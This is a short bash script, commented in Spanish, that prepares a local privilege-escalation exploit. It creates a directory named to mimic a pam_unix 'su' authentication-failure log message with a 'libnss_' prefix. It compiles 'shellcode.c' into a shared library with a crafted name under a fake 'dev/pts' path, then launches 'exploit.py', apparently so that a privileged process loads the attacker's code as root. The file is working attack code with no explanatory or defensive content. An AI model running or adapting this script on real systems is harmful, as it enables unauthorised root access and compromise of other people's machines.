#!/bin/bash


# Obtener UID
uid=$(id -u)

# Obtener TTY
tty=$(tty)
tty_number=$(basename "$tty")

user=$(whoami)

folder_name="libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=$uid euid=0 tty="
rm -rf "$folder_name"

mkdir "$folder_name"
mkdir "$folder_name/dev"
mkdir "$folder_name/dev/pts"

gcc -w -O3 -shared -nostdlib -o "$folder_name/dev/pts/$tty_number ruser=$user rhost=  user=roo.so.2"  shellcode.c

python exploit.py
